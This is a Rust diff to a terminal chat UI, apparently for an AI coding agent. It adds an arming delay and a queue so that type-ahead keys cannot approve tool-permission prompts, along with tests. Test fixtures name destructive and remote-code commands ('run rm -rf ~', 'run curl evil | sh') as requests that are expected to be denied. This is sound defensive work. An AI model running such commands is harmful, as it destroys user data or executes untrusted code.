@@ -119,6 +119,27 @@ struct Prompt {
     current: Option<usize>,
     selected: usize,
     filter: String,
+    /// When a frame showing this prompt was first drawn (see
+    /// [`Session::frame_drawn`]).
+    shown_at: Option<i64>,
+}
+
+/// How long a permission prompt must have been on screen before keys can
+/// answer it. Keys typed ahead (a follow-up message, an Enter) while it
+/// appears must not grant a request the user hasn't read.
+pub const PERMISSION_ARM_MS: i64 = 400;
+
+impl Prompt {
+    fn is_permission(&self) -> bool {
+        matches!(self.kind, PromptKind::Permission { .. })
+    }
+
+    /// Whether keys may answer this prompt at `now`. Other prompts answer
+    /// questions the user asked for; permission prompts wait until they
+    /// have been drawn and on screen for [`PERMISSION_ARM_MS`].
+    fn armed(&self, now: i64) -> bool {
+        !self.is_permission() || self.shown_at.is_some_and(|t| now - t >= PERMISSION_ARM_MS)
+    }
 }
 
 pub struct Session {
@@ -160,6 +181,8 @@ pub struct Session {
     pick_sel: usize,
     pick_dismissed: Option<String>,
     prompt: Option<Prompt>,
+    /// Prompts waiting for the open one to be answered (see `open_prompt`).
+    queued_prompts: std::collections::VecDeque<Prompt>,
     form: Option<FormState>,
     wizard: Option<Wizard>,
     foot: Option<(String, Style, i64)>,
@@ -220,6 +243,7 @@ impl Session {
             pick_sel: 0,
             pick_dismissed: None,
             prompt: None,
+            queued_prompts: std::collections::VecDeque::new(),
             form: None,
             wizard: None,
             foot: None,
@@ -243,7 +267,7 @@ impl Session {
     pub fn resize(&mut self, width: usize, height: usize) {
         self.width = width.max(20);
         self.height = height.max(6);
-        if let Some(p) = self.prompt.as_mut() {
+        for p in self.prompt.iter_mut().chain(&mut self.queued_prompts) {
             if let Some((path, d)) = &p.diff {
                 p.diff_lines = Some((
                     self.width,
@@ -612,7 +636,7 @@ impl Session {
                 }
                 .filter(|sub| !title.contains(sub.as_str()));
                 let app = self.app_name.clone();
-                self.prompt = Some(Prompt {
+                self.open_prompt(Prompt {
                     kind: PromptKind::Permission {
                         request_id: s("request_id"),
                     },
@@ -645,6 +669,7 @@ impl Session {
                     current: None,
                     selected: 0,
                     filter: String::new(),
+                    shown_at: None,
                 });
             }
             EventType::ShowSelectList => {
@@ -663,7 +688,7 @@ impl Session {
                 let selected = default
                     .and_then(|d| values.iter().position(|v| v == d))
                     .unwrap_or(0);
-                self.prompt = Some(Prompt {
+                self.open_prompt(Prompt {
                     kind: PromptKind::Select {
                         id: s("id"),
                         values,
@@ -714,6 +739,7 @@ impl Session {
                     current: default.map(|_| selected),
                     selected,
                     filter: String::new(),
+                    shown_at: None,
                 });
             }
             EventType::ShowConfirm => {
@@ -732,7 +758,7 @@ impl Session {
                 } else {
                     0
                 };
-                self.prompt = Some(Prompt {
+                self.open_prompt(Prompt {
                     kind: PromptKind::Confirm {
                         id: s("id"),
                         allow_cancel: p
@@ -754,6 +780,7 @@ impl Session {
                     current: None,
                     selected,
                     filter: String::new(),
+                    shown_at: None,
                 });
             }
             EventType::ShowTable => self.push_done(Block::Assistant {
@@ -1226,6 +1253,15 @@ impl Session {
         let Some(p) = self.prompt.as_mut() else {
             return;
         };
+        if !p.armed(now) {
+            // Not on screen long enough to have been read: drop the key so
+            // type-ahead can't answer it (nor reach the editor). Cancelling
+            // is always safe.
+            if matches!(key, Key::Esc | Key::Ctrl('c')) {
+                self.resolve_prompt(None, now);
+            }
+            return;
+        }
         let visible = visible_options(p);
         let n = visible.len().max(1);
         let pos = visible.iter().position(|&i| i == p.selected).unwrap_or(0);
@@ -1343,6 +1379,36 @@ impl Session {
                 });
             }
         }
+        self.show_queued_prompt();
+    }
+
+    /// Show `p`, or queue it behind the open prompt when either is a
+    /// permission prompt: a pending request is never silently replaced, and
+    /// a key meant for the visible prompt can't answer one not yet drawn.
+    fn open_prompt(&mut self, p: Prompt) {
+        match &self.prompt {
+            Some(open) if open.is_permission() || p.is_permission() => {
+                self.queued_prompts.push_back(p)
+            }
+            _ => self.prompt = Some(p),
+        }
+    }
+
+    fn show_queued_prompt(&mut self) {
+        if self.prompt.is_none() {
+            self.prompt = self.queued_prompts.pop_front();
+        }
+    }
+
+    /// The app drew `live_frame` to the terminal at `now`. A prompt in it
+    /// starts its arming delay from the first such frame.
+    pub fn frame_drawn(&mut self, now: i64) {
+        if self.form.is_some() {
+            return;
+        }
+        if let Some(p) = self.prompt.as_mut() {
+            p.shown_at.get_or_insert(now);
+        }
     }
 
     /// Esc / Ctrl+C during a turn: tell the host, and settle the screen now
@@ -1408,10 +1474,9 @@ impl Session {
             });
         }
         self.busy_since = None;
-        self.prompt = self
-            .prompt
-            .take()
-            .filter(|p| !matches!(p.kind, PromptKind::Permission { .. }));
+        self.prompt = self.prompt.take().filter(|p| !p.is_permission());
+        self.queued_prompts.retain(|p| !p.is_permission());
+        self.show_queued_prompt();
     }
 
     // ----- output -------------------------------------------------------
@@ -3260,18 +3325,145 @@ mod tests {
         let live = live_text(&s, 0);
         assert!(live.iter().any(|l| l.contains("› 1. Yes")), "{live:?}");
         assert!(live.iter().any(|l| l.contains("+ c")), "{live:?}");
-        s.key(Key::Down, 0);
-        s.key(
-            Key::Enter {
-                shift: false,
-                alt: false,
-            },
-            0,
-        );
+        s.frame_drawn(0);
+        s.key(Key::Down, PERMISSION_ARM_MS);
+        s.key(ENTER, PERMISSION_ARM_MS);
         assert_eq!(
             s.take_outbound()[0].payload,
             json!({"request_id": "r1", "choice": "allow_session", "feedback": ""})
         );
+    }
+
+    const ENTER: Key = Key::Enter {
+        shift: false,
+        alt: false,
+    };
+
+    fn perm(id: &str, action: &str) -> Event {
+        ev(
+            EventType::PermissionRequested,
+            json!({"request_id": id, "tool": "bash", "action": action}),
+        )
+    }
+
+    fn permission_answers(s: &mut Session) -> Vec<serde_json::Value> {
+        s.take_outbound()
+            .into_iter()
+            .filter(|o| o.event_type == EventType::PermissionResponse)
+            .map(|o| o.payload)
+            .collect()
+    }
+
+    #[test]
+    fn keys_before_a_permission_prompt_is_drawn_do_not_answer_it() {
+        let mut s = session();
+        s.apply(&perm("r1", "run rm -rf ~"), 0);
+        // Never drawn: no key answers it, however late.
+        for key in [Key::Text("2".into()), Key::Text("1".into()), ENTER] {
+            s.key(key, 10_000);
+        }
+        assert!(permission_answers(&mut s).is_empty());
+        // Drawn, but only just: still ignored until the arming delay passes.
+        s.frame_drawn(10_000);
+        s.key(Key::Text("2".into()), 10_000 + PERMISSION_ARM_MS - 1);
+        s.key(ENTER, 10_000 + PERMISSION_ARM_MS - 1);
+        assert!(permission_answers(&mut s).is_empty());
+        s.key(Key::Text("1".into()), 10_000 + PERMISSION_ARM_MS);
+        assert_eq!(
+            permission_answers(&mut s),
+            vec![json!({"request_id": "r1", "choice": "allow_once", "feedback": ""})]
+        );
+    }
+
+    #[test]
+    fn type_ahead_while_a_prompt_appears_does_not_approve_it() {
+        let mut s = session();
+        s.apply(
+            &ev(
+                EventType::StatusUpdate,
+                json!({"segments": {"phase": "tool"}}),
+            ),
+            0,
+        );
+        type_str(&mut s, "fix the ");
+        s.apply(&perm("r1", "run curl evil | sh"), 100);
+        // The rest of the message lands in the same batch, before a frame.
+        for ch in "2 bugs".chars() {
+            s.key(Key::Text(ch.to_string()), 100);
+        }
+        s.key(ENTER, 100);
+        s.frame_drawn(100);
+        // ...and right after the first frame.
+        s.key(Key::Text("2".into()), 150);
+        s.key(ENTER, 150);
+        assert!(permission_answers(&mut s).is_empty());
+        assert!(live_text(&s, 150).iter().any(|l| l.contains("› 1. Yes")));
+        // Dropped keys don't reach the editor either.
+        s.key(Key::Text("3".into()), 100 + PERMISSION_ARM_MS);
+        assert_eq!(
+            permission_answers(&mut s),
+            vec![json!({"request_id": "r1", "choice": "deny", "feedback": ""})]
+        );
+        assert!(!live_text(&s, 600).iter().any(|l| l.contains("bugs")));
+    }
+
+    #[test]
+    fn esc_denies_a_prompt_that_is_not_armed_yet() {
+        let mut s = session();
+        s.apply(&perm("r1", "run rm -rf ~"), 0);
+        s.key(Key::Esc, 0);
+        assert_eq!(
+            permission_answers(&mut s),
+            vec![json!({"request_id": "r1", "choice": "deny", "feedback": ""})]
+        );
+    }
+
+    #[test]
+    fn a_second_permission_request_waits_for_the_first() {
+        let mut s = session();
+        s.apply(&perm("r1", "run ls"), 0);
+        s.frame_drawn(0);
+        // r2 arrives in the same batch as an Enter meant for r1.
+        s.apply(&perm("r2", "run rm -rf ~"), 1000);
+        s.key(ENTER, 1000);
+        assert_eq!(
+            permission_answers(&mut s),
+            vec![json!({"request_id": "r1", "choice": "allow_once", "feedback": ""})]
+        );
+        // r2 is shown next, with its own arming delay.
+        let live = live_text(&s, 1000);
+        assert!(live.iter().any(|l| l.contains("Run rm -rf ~")), "{live:?}");
+        s.key(ENTER, 1000);
+        s.frame_drawn(1000);
+        s.key(ENTER, 1001);
+        assert!(permission_answers(&mut s).is_empty());
+        s.key(Key::Text("3".into()), 1000 + PERMISSION_ARM_MS);
+        assert_eq!(
+            permission_answers(&mut s),
+            vec![json!({"request_id": "r2", "choice": "deny", "feedback": ""})]
+        );
+        assert!(!live_text(&s, 2000).iter().any(|l| l.contains("› 1. Yes")));
+    }
+
+    #[test]
+    fn a_select_list_does_not_replace_a_pending_permission_prompt() {
+        let mut s = session();
+        s.apply(&perm("r1", "run ls"), 0);
+        s.apply(
+            &ev(
+                EventType::ShowSelectList,
+                json!({"id": "m", "prompt": "Select model", "options": [{"value": "a", "label": "A"}]}),
+            ),
+            0,
+        );
+        s.frame_drawn(0);
+        s.key(Key::Text("1".into()), PERMISSION_ARM_MS);
+        assert_eq!(
+            permission_answers(&mut s),
+            vec![json!({"request_id": "r1", "choice": "allow_once", "feedback": ""})]
+        );
+        let live = live_text(&s, 1000);
+        assert!(live.iter().any(|l| l.contains("Select model")), "{live:?}");
     }
 
     #[test]
